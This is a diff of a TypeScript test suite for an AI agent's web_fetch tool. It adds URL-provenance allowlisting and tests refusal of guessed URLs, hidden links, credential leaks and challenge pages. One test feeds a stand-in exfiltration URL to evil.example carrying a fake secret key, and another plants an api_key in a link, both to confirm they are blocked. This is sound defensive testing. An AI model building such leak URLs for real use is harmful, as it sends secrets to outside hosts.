@@ -6,20 +6,32 @@ import {
   EthicsRefusedError,
   FetchError,
   HybridContentFetcher,
+  ReadabilityExtractor,
   type ContentFetcher,
   type DomainRankSignal,
   type FetchedDoc,
 } from '@yantra/core';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 
+import { browserNavigateSpec } from '../../../../src/adapters/pi/tools/browser-navigate.js';
 import {
   WEB_FETCH_FAILURE_CAUSES,
   webFetchSpec,
 } from '../../../../src/adapters/pi/tools/web-fetch.js';
 import { wrapTool } from '../../../../src/runtime/middleware.js';
+import { UrlProvenance } from '../../../../src/runtime/url-provenance.js';
 
 import {
+  LISTING_SELLERS,
+  articleHtml,
+  detailHtml,
+  emptyHtml,
+  hubHtml,
+  listingHtml,
+} from './page-fixtures.js';
+import {
   buildServices,
+  attestedHosts,
   extractorReturning,
   fetchedDoc,
   fetcherReturning,
@@ -27,6 +39,16 @@ import {
 } from './test-support.js';
 
 const CANARY = 'sk-FETCHCANARYabcdefghijklmnop';
+
+/** Every host this suite fetches from, attested as `--allow-host` would. */
+const FETCH_HOSTS = [
+  'blocked.example',
+  'content.example',
+  'evil.example',
+  'example.com',
+  'site.example',
+  'slow.example',
+];
 
 describe('@no-llm web_fetch tool', () => {
   let runDir: string;
@@ -40,6 +62,7 @@ describe('@no-llm web_fetch tool', () => {
 
   it('fetches, extracts, and returns bounded readable text', async () => {
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       fetch: {
         fetcher: fetcherReturning(fetchedDoc()),
@@ -56,13 +79,15 @@ describe('@no-llm web_fetch tool', () => {
       { url: 'https://example.com/a', tool: 'web_fetch', title: 'Fixture Title' },
     ]);
     // A successfully fetched page is attested, so navigating to it is allowed.
-    expect(services.urlProvenance.has('https://example.com/a')).toBe(true);
+    // The host is allowlisted for the suite, so `size` shows what the fetch itself recorded.
+    expect(services.urlProvenance.size).toBeGreaterThan(0);
   });
 
   it('records nothing in provenance when the fetch does not produce a page', async () => {
     // A URL that could not be fetched and read attests nothing — otherwise a
     // failed guess would still earn the right to navigate to it.
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       fetch: {
         fetcher: fetcherReturning(fetchedDoc()),
@@ -76,7 +101,7 @@ describe('@no-llm web_fetch tool', () => {
     );
 
     expect(result.error_code).toBe('EXTRACTION_EMPTY');
-    expect(services.urlProvenance.has('https://example.com/a')).toBe(false);
+    expect(services.urlProvenance.size).toBe(0);
   });
 
   it('is rejected with EVIDENCE_FROZEN once the evidence phase is frozen', async () => {
@@ -84,6 +109,7 @@ describe('@no-llm web_fetch tool', () => {
     // topic and published a different (wrong) conclusion. The freeze makes the
     // nudge turn structurally publish-only.
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       fetch: {
         fetcher: fetcherReturning(fetchedDoc()),
@@ -110,7 +136,11 @@ describe('@no-llm web_fetch tool', () => {
       },
       { taskId: 't', runId: 'r', stepId: 'web_fetch' },
     );
-    const services = buildServices({ runDir, fetch: { ethics: refusingEthics(refusal) } });
+    const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
+      runDir,
+      fetch: { ethics: refusingEthics(refusal) },
+    });
     const tool = wrapTool(webFetchSpec(services), services);
     const result = await tool.execute({ url: 'https://example.com/a' }, undefined);
     expect(result.status).toBe('error');
@@ -120,6 +150,7 @@ describe('@no-llm web_fetch tool', () => {
 
   it('refuses a non-text content type', async () => {
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       fetch: { fetcher: fetcherReturning(fetchedDoc({ contentType: 'application/pdf' })) },
     });
@@ -130,6 +161,7 @@ describe('@no-llm web_fetch tool', () => {
 
   it('maps an over-size fetch to CONTENT_TOO_LARGE', async () => {
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       fetch: {
         fetcher: {
@@ -147,6 +179,7 @@ describe('@no-llm web_fetch tool', () => {
 
   it('returns EXTRACTION_EMPTY with next-step guidance when no article extracts', async () => {
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       fetch: { fetcher: fetcherReturning(fetchedDoc()), extractor: extractorReturning(null) },
     });
@@ -155,8 +188,9 @@ describe('@no-llm web_fetch tool', () => {
     expect(result.status).toBe('error');
     expect(result.error_code).toBe('EXTRACTION_EMPTY');
     expect(result.retryable).toBe(false);
-    // The message must steer the agent to a different URL, not a blind retry.
-    expect(result.modelText).toMatch(/article URL/i);
+    // The message says what was looked for and steers to a different URL, not a blind retry.
+    expect(result.modelText).toMatch(/looked for .*readable article.*found none/iu);
+    expect(result.modelText).toMatch(/different URL/iu);
   });
 
   it('recovers a bot-refused fetch through the hybrid browser fallback (401/403 class)', async () => {
@@ -171,6 +205,7 @@ describe('@no-llm web_fetch tool', () => {
         ),
     };
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       fetch: {
         fetcher: new HybridContentFetcher({
@@ -187,7 +222,10 @@ describe('@no-llm web_fetch tool', () => {
   });
 
   it('rejects a URL that fails the outbound policy with a stable code', async () => {
-    const services = buildServices({ runDir });
+    const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
+      runDir,
+    });
     const tool = wrapTool(webFetchSpec(services), services);
     const result = await tool.execute(
       { url: 'https://evil.example/x?leak=sk-ABCDEFGHIJKLMNOPQRSTUVWX' },
@@ -199,6 +237,7 @@ describe('@no-llm web_fetch tool', () => {
 
   it('sanitizes credential canaries out of extracted content', async () => {
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       fetch: {
         fetcher: fetcherReturning(fetchedDoc()),
@@ -213,6 +252,7 @@ describe('@no-llm web_fetch tool', () => {
   it('stores large content as a capture reference instead of inline', async () => {
     const big = 'lorem ipsum '.repeat(5000);
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       fetch: {
         fetcher: fetcherReturning(fetchedDoc()),
@@ -223,10 +263,16 @@ describe('@no-llm web_fetch tool', () => {
     const tool = wrapTool(webFetchSpec(services), services);
     const result = await tool.execute({ url: 'https://example.com/a' }, undefined);
     expect(result.status).toBe('ok');
-    const payload = JSON.parse(result.modelText) as { capture_ref?: string };
+    const payload = JSON.parse(result.modelText) as {
+      capture_ref?: string;
+      coverage?: { omitted?: string[] };
+    };
     expect(payload.capture_ref).toMatch(/^cap-/);
+    expect(payload.coverage?.omitted?.join(' ')).toMatch(/excerpt is shown/u);
+    // The full text, and the full analysis (written whenever a view is trimmed).
     const files = await readdir(join(runDir, 'captures'));
-    expect(files.length).toBe(1);
+    expect(files).toHaveLength(2);
+    expect(files).toContain(`${payload.capture_ref ?? ''}.txt`);
   });
 
   it('records blocked and fetch failures with the matching negative reason', async () => {
@@ -241,6 +287,7 @@ describe('@no-llm web_fetch tool', () => {
       { taskId: 't', runId: 'r', stepId: 'web_fetch' },
     );
     const blockedServices = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       domain: { rank: { record: (signal) => blockedSignals.push(signal) } },
       fetch: { ethics: refusingEthics(refusal) },
@@ -254,6 +301,7 @@ describe('@no-llm web_fetch tool', () => {
 
     const fetchSignals: DomainRankSignal[] = [];
     const fetchServices = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       domain: { rank: { record: (signal) => fetchSignals.push(signal) } },
       fetch: {
@@ -276,6 +324,7 @@ describe('@no-llm web_fetch tool', () => {
   ] as const)('records %s as an extraction failure', async (expectedCode, contentType, empty) => {
     const signals: DomainRankSignal[] = [];
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       domain: { rank: { record: (signal) => signals.push(signal) } },
       fetch: {
@@ -295,6 +344,7 @@ describe('@no-llm web_fetch tool', () => {
 
   it('does not let a throwing rank sink alter a fetch result', async () => {
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       domain: {
         rank: {
@@ -336,6 +386,7 @@ describe('@no-llm web_fetch — run-health diagnostics (FEAT-048)', () => {
 
   it('records a successful fetch with its mode and host', async () => {
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       fetch: {
         fetcher: fetcherReturning(fetchedDoc({ fetchMode: 'browser' })),
@@ -358,6 +409,7 @@ describe('@no-llm web_fetch — run-health diagnostics (FEAT-048)', () => {
 
   it('counts a fetched-but-unreadable page as a fetch and records the failure host', async () => {
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       fetch: { fetcher: fetcherReturning(fetchedDoc()), extractor: extractorReturning('') },
     });
@@ -382,6 +434,7 @@ describe('@no-llm web_fetch — run-health diagnostics (FEAT-048)', () => {
   it('attributes a navigation-budget refusal to the run, not the site', async () => {
     const signals: DomainRankSignal[] = [];
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       limits: { maxNavigations: 1 },
       domain: { rank: { record: (signal) => signals.push(signal) } },
@@ -468,7 +521,11 @@ describe('@no-llm web_fetch — run-health diagnostics (FEAT-048)', () => {
 
     const causes: string[] = [];
     for (const scenario of scenarios) {
-      const services = buildServices({ runDir, ...scenario.options });
+      const services = buildServices({
+        urlProvenance: attestedHosts(...FETCH_HOSTS),
+        runDir,
+        ...scenario.options,
+      });
       await wrapTool(webFetchSpec(services), services).execute(
         { url: scenario.url ?? 'https://example.com/a' },
         undefined,
@@ -533,6 +590,7 @@ describe('@no-llm web_fetch — run document store (FEAT-050)', () => {
   it('three reads of one URL make one fetch, charge one navigation, and repeat as already_read', async () => {
     const counting = countingFetcher();
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       fetch: { fetcher: counting.fetcher, extractor: extractorReturning('Page body text.') },
     });
@@ -558,6 +616,7 @@ describe('@no-llm web_fetch — run document store (FEAT-050)', () => {
   it('records the page in the ledger once, under its evidence ID', async () => {
     const counting = countingFetcher();
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       fetch: { fetcher: counting.fetcher, extractor: extractorReturning('Body.') },
     });
@@ -576,6 +635,7 @@ describe('@no-llm web_fetch — run document store (FEAT-050)', () => {
   it('mints distinct, dense IDs for distinct pages', async () => {
     const counting = countingFetcher();
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       fetch: { fetcher: counting.fetcher, extractor: extractorReturning('Body.') },
     });
@@ -592,7 +652,11 @@ describe('@no-llm web_fetch — run document store (FEAT-050)', () => {
     const counting = countingFetcher(
       (url) => new FetchError('HTTP 404', { url, kind: 'http-status', statusCode: 404 }),
     );
-    const services = buildServices({ runDir, fetch: { fetcher: counting.fetcher } });
+    const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
+      runDir,
+      fetch: { fetcher: counting.fetcher },
+    });
     const tool = wrapTool(webFetchSpec(services), services);
 
     const first = await tool.execute({ url: 'https://example.com/missing' }, undefined);
@@ -613,6 +677,7 @@ describe('@no-llm web_fetch — run document store (FEAT-050)', () => {
       call === 1 ? new FetchError('slow', { url, kind: 'timeout' }) : null,
     );
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       fetch: { fetcher: counting.fetcher, extractor: extractorReturning('Body.') },
     });
@@ -636,7 +701,11 @@ describe('@no-llm web_fetch — run document store (FEAT-050)', () => {
     const counting = countingFetcher(
       (url) => new FetchError('x', { url, kind: 'http-status', statusCode: status }),
     );
-    const services = buildServices({ runDir, fetch: { fetcher: counting.fetcher } });
+    const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
+      runDir,
+      fetch: { fetcher: counting.fetcher },
+    });
     const tool = wrapTool(webFetchSpec(services), services);
 
     await tool.execute({ url: 'https://example.com/x' }, undefined);
@@ -657,6 +726,7 @@ describe('@no-llm web_fetch — run document store (FEAT-050)', () => {
     ] as const) {
       let ethicsChecks = 0;
       const services = buildServices({
+        urlProvenance: attestedHosts(...FETCH_HOSTS),
         runDir,
         fetch: {
           ethics: {
@@ -687,6 +757,7 @@ describe('@no-llm web_fetch — run document store (FEAT-050)', () => {
     for (const { doc, text } of cases) {
       let calls = 0;
       const services = buildServices({
+        urlProvenance: attestedHosts(...FETCH_HOSTS),
         runDir,
         fetch: {
           fetcher: {
@@ -710,6 +781,7 @@ describe('@no-llm web_fetch — run document store (FEAT-050)', () => {
   it('a budget refusal is never memoized, and a page already read stays readable', async () => {
     const counting = countingFetcher();
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       limits: { maxNavigations: 1 },
       fetch: { fetcher: counting.fetcher, extractor: extractorReturning('Body.') },
@@ -722,7 +794,10 @@ describe('@no-llm web_fetch — run document store (FEAT-050)', () => {
     const repeatOfRead = await tool.execute({ url: 'https://example.com/a' }, undefined);
 
     expect(refused.error_code).toBe('BUDGET_EXHAUSTED');
-    expect(refusedAgain.details).toBeNull();
+    // Only the audit provenance: a budget refusal carries no memo marker.
+    expect(refusedAgain.details).toEqual({
+      provenance: { match: 'allowed-host', kind: 'allow-host' },
+    });
     // The store answers a page already read without a navigation.
     expect(repeatOfRead.status).toBe('ok');
     expect(parse(repeatOfRead.modelText)).toMatchObject({ already_read: 'S1' });
@@ -730,7 +805,10 @@ describe('@no-llm web_fetch — run document store (FEAT-050)', () => {
   });
 
   it('a policy refusal never reaches the store, even for a page already recorded', async () => {
-    const services = buildServices({ runDir });
+    const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
+      runDir,
+    });
     services.documents.observe('http://example.com/plain', {
       title: null,
       tool: 'browser_extract',
@@ -745,6 +823,7 @@ describe('@no-llm web_fetch — run document store (FEAT-050)', () => {
   it('a redirect target already read is answered from the store', async () => {
     const calls: string[] = [];
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       fetch: {
         fetcher: {
@@ -766,8 +845,10 @@ describe('@no-llm web_fetch — run document store (FEAT-050)', () => {
   });
 
   it('a repeat of a captured page carries the capture reference, not the text', async () => {
-    const big = 'x'.repeat(20 * 1024);
+    // Larger than the full-view budget (90% of a 24 KiB result), so it is excerpted.
+    const big = 'lorem ipsum dolor '.repeat(2_000);
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       fetch: { fetcher: fetcherReturning(fetchedDoc()), extractor: extractorReturning(big) },
     });
@@ -792,6 +873,7 @@ describe('@no-llm web_fetch — run document store (FEAT-050)', () => {
     });
     let calls = 0;
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       fetch: {
         fetcher: {
@@ -861,6 +943,7 @@ describe('@no-llm web_fetch — challenge pages (FEAT-050, policy b)', () => {
     const challenged = challengedFetcher();
     const signals: DomainRankSignal[] = [];
     const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
       runDir,
       fetch: { fetcher: challenged.fetcher, extractor: extractorReturning('never read') },
       domain: { rank: { record: (signal) => signals.push(signal) } },
@@ -873,11 +956,16 @@ describe('@no-llm web_fetch — challenge pages (FEAT-050, policy b)', () => {
 
     expect(result.error_code).toBe('SITE_CHALLENGE');
     expect(result.retryable).toBe(false);
-    expect(result.details).toEqual({ host: 'site.example', tier: 'browser', handoff: true });
+    expect(result.details).toEqual({
+      host: 'site.example',
+      tier: 'browser',
+      handoff: true,
+      provenance: { match: 'allowed-host', kind: 'allow-host' },
+    });
     expect(result.modelText).toMatch(/human-verification page/);
     expect(result.modelText).toContain('result_publish');
     expect(services.evidence.isEmpty()).toBe(true);
-    expect(services.urlProvenance.has('https://site.example/list')).toBe(false);
+    expect(services.urlProvenance.size).toBe(0);
     expect(services.documents.entries()).toEqual([]);
     expect(signals).toEqual([{ domain: 'site.example', delta: -1, reason: 'blocked' }]);
     expect(services.runHealth.toolOutcomes()[0]).toMatchObject({
@@ -889,7 +977,11 @@ describe('@no-llm web_fetch — challenge pages (FEAT-050, policy b)', () => {
 
   it('never fetches a challenged URL again in the run', async () => {
     const challenged = challengedFetcher();
-    const services = buildServices({ runDir, fetch: { fetcher: challenged.fetcher } });
+    const services = buildServices({
+      urlProvenance: attestedHosts(...FETCH_HOSTS),
+      runDir,
+      fetch: { fetcher: challenged.fetcher },
+    });
     const tool = wrapTool(webFetchSpec(services), services);
 
     await tool.execute({ url: 'https://site.example/list' }, undefined);
@@ -905,5 +997,310 @@ describe('@no-llm web_fetch — challenge pages (FEAT-050, policy b)', () => {
 
   it('declares challenge as a closed cause', () => {
     expect(WEB_FETCH_FAILURE_CAUSES).toContain('challenge');
+  });
+});
+
+describe('@no-llm web_fetch — discovered-link provenance (FEAT-051)', () => {
+  let runDir: string;
+
+  beforeEach(async () => {
+    runDir = await mkdtemp(join(tmpdir(), 'yantra-web-fetch-prov-'));
+  });
+
+  afterEach(async () => {
+    await rm(runDir, { recursive: true, force: true });
+  });
+
+  const HUB = 'https://shop.test/hub';
+  const HUB_HTML =
+    '<html><head><title>Hub</title></head><body><main><h1>Departments</h1>' +
+    '<p>Browse our departments below; each one lists every product we carry in that area, ' +
+    'with prices, availability, and the stores that stock it.</p>' +
+    '<ul><li><a href="/dept/garden">Garden</a></li><li><a href="/dept/kitchen">Kitchen</a></li></ul>' +
+    '<div aria-hidden="true"><a href="/dept/secret">Secret</a></div>' +
+    '</main></body></html>';
+  const LEAF_HTML =
+    '<html><head><title>Garden</title></head><body><main><article><h1>Garden</h1>' +
+    '<p>Everything for the garden, from hand tools to raised beds, is listed on this page with ' +
+    'current prices and the nearest store that has each item in stock today.</p>' +
+    '</article></main></body></html>';
+
+  /** A fetcher serving fixed pages by URL, counting every request. */
+  function pagesFetcher(pages: Readonly<Record<string, string>>): {
+    readonly fetcher: ContentFetcher;
+    readonly calls: string[];
+  } {
+    const calls: string[] = [];
+    return {
+      calls,
+      fetcher: {
+        fetch: (url) => {
+          calls.push(url);
+          const html = pages[url];
+          if (html === undefined) {
+            return Promise.reject(
+              new FetchError('missing', { url, kind: 'http-status', statusCode: 404 }),
+            );
+          }
+          return Promise.resolve(fetchedDoc({ url, finalUrl: url, html }));
+        },
+      },
+    };
+  }
+
+  function servicesFor(pages: Readonly<Record<string, string>>, provenance = new UrlProvenance()) {
+    const served = pagesFetcher(pages);
+    const services = buildServices({
+      runDir,
+      urlProvenance: provenance,
+      fetch: { fetcher: served.fetcher, extractor: new ReadabilityExtractor() },
+    });
+    return { services, calls: served.calls, tool: wrapTool(webFetchSpec(services), services) };
+  }
+
+  function goal(url: string): UrlProvenance {
+    const provenance = new UrlProvenance();
+    provenance.seed({ goal: `read ${url}` });
+    return provenance;
+  }
+
+  it('refuses an unattested URL before any fetch or charge', async () => {
+    const { services, calls, tool } = servicesFor({ [HUB]: HUB_HTML });
+
+    const result = await tool.execute({ url: HUB }, undefined);
+
+    expect(result.error_code).toBe('URL_NOT_FROM_EVIDENCE');
+    expect(result.retryable).toBe(true);
+    expect(result.modelText).toContain('limit: 0');
+    expect(result.details).toEqual({ provenance: { match: 'none', kind: 'none' } });
+    expect(calls).toEqual([]);
+    expect(services.budgets.snapshot().navigations).toBe(0);
+  });
+
+  it('allows a goal URL and audits it as goal-attested', async () => {
+    const { tool } = servicesFor({ [HUB]: HUB_HTML }, goal(HUB));
+
+    const result = await tool.execute({ url: HUB }, undefined);
+
+    expect(result.status).toBe('ok');
+    expect((result.details as { provenance?: unknown }).provenance).toEqual({
+      match: 'exact',
+      kind: 'goal',
+    });
+  });
+
+  it('offers the page links and lets the next fetch follow one, audited as discovered', async () => {
+    const leaf = 'https://shop.test/dept/garden';
+    const { calls, tool } = servicesFor({ [HUB]: HUB_HTML, [leaf]: LEAF_HTML }, goal(HUB));
+
+    const hub = JSON.parse((await tool.execute({ url: HUB }, undefined)).modelText) as {
+      links: { text: string; url: string; kind: string }[];
+    };
+    expect(hub.links).toContainEqual({ text: 'Garden', url: leaf, kind: 'content' });
+
+    const followed = await tool.execute({ url: leaf }, undefined);
+
+    expect(followed.status).toBe('ok');
+    expect((followed.details as { provenance?: unknown }).provenance).toEqual({
+      match: 'exact',
+      kind: 'discovered',
+      via: 'S1',
+      link_kind: 'content',
+    });
+    expect(calls).toEqual([HUB, leaf]);
+  });
+
+  it('refuses a URL the page shows only inside an aria-hidden block', async () => {
+    const { tool, calls } = servicesFor({ [HUB]: HUB_HTML }, goal(HUB));
+    await tool.execute({ url: HUB }, undefined);
+
+    const hidden = await tool.execute({ url: 'https://shop.test/dept/secret' }, undefined);
+
+    expect(hidden.error_code).toBe('URL_NOT_FROM_EVIDENCE');
+    expect(calls).toEqual([HUB]);
+  });
+
+  it('uses the repeated wording on a second refusal of the same URL', async () => {
+    const { tool } = servicesFor({});
+    const first = await tool.execute({ url: 'https://shop.test/guess' }, undefined);
+    const second = await tool.execute({ url: 'https://shop.test/guess#again' }, undefined);
+
+    expect(first.modelText).not.toMatch(/already been refused/u);
+    expect(second.modelText).toMatch(/already been refused in this run/u);
+  });
+
+  it('closes the laundering path: a guessed URL can be neither fetched nor navigated', async () => {
+    const guessed = 'https://shop.test/vehicle/itm-05';
+    const { services, tool, calls } = servicesFor({ [guessed]: LEAF_HTML });
+
+    const fetched = await tool.execute({ url: guessed }, undefined);
+    const navigated = await wrapTool(browserNavigateSpec(services), services).execute(
+      { url: guessed },
+      undefined,
+    );
+
+    expect(fetched.error_code).toBe('URL_NOT_FROM_EVIDENCE');
+    expect(navigated.error_code).toBe('URL_NOT_FROM_EVIDENCE');
+    expect(navigated.modelText).toMatch(/already been refused in this run/u);
+    expect(calls).toEqual([]);
+  });
+
+  it('withholds a link the sanitizer would alter and never attests it', async () => {
+    const leaky = 'https://shop.test/dept/tools?api_key=sk-LEAKYKEYabcdefghijklmnopqrstu';
+    const html = HUB_HTML.replace('</ul>', `<li><a href="${leaky}">Tools</a></li></ul>`);
+    const { services, tool } = servicesFor({ [HUB]: html }, goal(HUB));
+
+    const result = await tool.execute({ url: HUB }, undefined);
+
+    expect(result.modelText).not.toContain('LEAKYKEY');
+    expect(services.urlProvenance.has(leaky)).toBe(false);
+  });
+});
+
+describe('@no-llm web_fetch — shape-aware view (FEAT-051)', () => {
+  let runDir: string;
+
+  beforeEach(async () => {
+    runDir = await mkdtemp(join(tmpdir(), 'yantra-web-fetch-shape-'));
+  });
+
+  afterEach(async () => {
+    await rm(runDir, { recursive: true, force: true });
+  });
+
+  const URL_OF = (path: string): string => `https://shop.test${path}`;
+
+  function fetchOf(html: string, path = '/page') {
+    const url = URL_OF(path);
+    const calls: string[] = [];
+    const services = buildServices({
+      runDir,
+      urlProvenance: attestedHosts('shop.test'),
+      fetch: {
+        fetcher: {
+          fetch: (target) => {
+            calls.push(target);
+            return Promise.resolve(fetchedDoc({ url: target, finalUrl: target, html }));
+          },
+        },
+        extractor: new ReadabilityExtractor(),
+      },
+    });
+    const tool = wrapTool(webFetchSpec(services), services);
+    return { services, calls, url, run: () => tool.execute({ url }, undefined) };
+  }
+
+  it('reads a listing as a collection with anchored records that keep the seller', async () => {
+    const { run, services } = fetchOf(listingHtml(), '/new/results');
+    const model = JSON.parse((await run()).modelText) as {
+      shape: string;
+      records: { id: string; text?: string[]; links?: { text: string }[] }[];
+      links: { kind: string; text: string }[];
+    };
+
+    expect(model.shape).toBe('collection');
+    expect(model.records.map((record) => record.id)).toEqual([
+      'S1#r1',
+      'S1#r2',
+      'S1#r3',
+      'S1#r4',
+      'S1#r5',
+      'S1#r6',
+    ]);
+    expect(model.records[0]?.text).toContain(LISTING_SELLERS[0]);
+    expect(model.links.filter((link) => link.kind === 'facet').map((link) => link.text)).toEqual([
+      'AWD (9)',
+      'FWD (3)',
+    ]);
+    // The ledger excerpt for a collection is its first records, not article fragments.
+    const [entry] = services.evidence.entries();
+    expect(entry?.excerpt).toContain(LISTING_SELLERS[0]);
+    for (const seller of LISTING_SELLERS.slice(0, 3)) expect(entry?.excerpt).toContain(seller);
+    expect(entry?.excerpt).not.toContain(LISTING_SELLERS[3]);
+    expect(services.documents.resolveAnchor('S1#r2')?.record.title).toBe('New 2026 Teyra Summit 2');
+  });
+
+  it('reads a detail page as fields holding both colors', async () => {
+    const { run } = fetchOf(detailHtml('Glacier White', 'Black Leather', 'Lakeside Motors'));
+    const model = JSON.parse((await run()).modelText) as {
+      shape: string;
+      fields: Record<string, string>;
+    };
+
+    expect(model.shape).toBe('detail');
+    expect(model.fields['Exterior color']).toBe('Glacier White');
+    expect(model.fields['Interior color']).toBe('Black Leather');
+  });
+
+  it('keeps an article text byte-identical to the article extractor', async () => {
+    const { run, url } = fetchOf(articleHtml());
+    const model = JSON.parse((await run()).modelText) as {
+      shape: string;
+      text: string;
+      published_at: string;
+    };
+    const article = await new ReadabilityExtractor().extract(
+      fetchedDoc({ url, finalUrl: url, html: articleHtml() }),
+    );
+
+    expect(model.shape).toBe('article');
+    expect(model.text).toBe(article?.contentText);
+    expect(model.published_at).toBe('2026-05-10T12:00:00.000Z');
+  });
+
+  it('reads a hub as an index of links', async () => {
+    const { run } = fetchOf(hubHtml());
+    const model = JSON.parse((await run()).modelText) as { shape: string; links: unknown[] };
+
+    expect(model.shape).toBe('index');
+    expect(model.links).toHaveLength(3);
+  });
+
+  it('reports an empty page with what was looked for', async () => {
+    const result = await fetchOf(emptyHtml()).run();
+
+    expect(result.error_code).toBe('EXTRACTION_EMPTY');
+    expect(result.modelText).toContain('repeated records, structured data, tables');
+  });
+
+  it('serves a page first shown as a search summary in full from the store, then already_read', async () => {
+    const { services, calls, url, run } = fetchOf(listingHtml(), '/new/results');
+    // As web_search leaves it: read once, attached as a summary.
+    const read = await services.documents.read(url, () =>
+      Promise.resolve({
+        ok: true as const,
+        value: null,
+        meta: {
+          url,
+          finalUrl: url,
+          title: 'Teyra',
+          fetchMode: 'http' as const,
+          tool: 'web_search' as const,
+        },
+      }),
+    );
+    const analysis = (
+      await new ReadabilityExtractor().extractPage(
+        fetchedDoc({ url, finalUrl: url, html: listingHtml() }),
+      )
+    ).page;
+    services.documents.attachPage(read.kind === 'fetched' ? read.record.sourceId : 'S0', analysis, {
+      delivered: 'summary',
+      article: null,
+    });
+    const before = services.budgets.snapshot().navigations;
+
+    const full = JSON.parse((await run()).modelText) as {
+      from_store?: boolean;
+      records: unknown[];
+    };
+    const again = JSON.parse((await run()).modelText) as { already_read?: string };
+
+    expect(full.from_store).toBe(true);
+    expect(full.records).toHaveLength(6);
+    expect(again.already_read).toBe('S1');
+    expect(calls).toEqual([]);
+    expect(services.budgets.snapshot().navigations).toBe(before);
+    expect(services.evidence.isEmpty()).toBe(true);
   });
 });
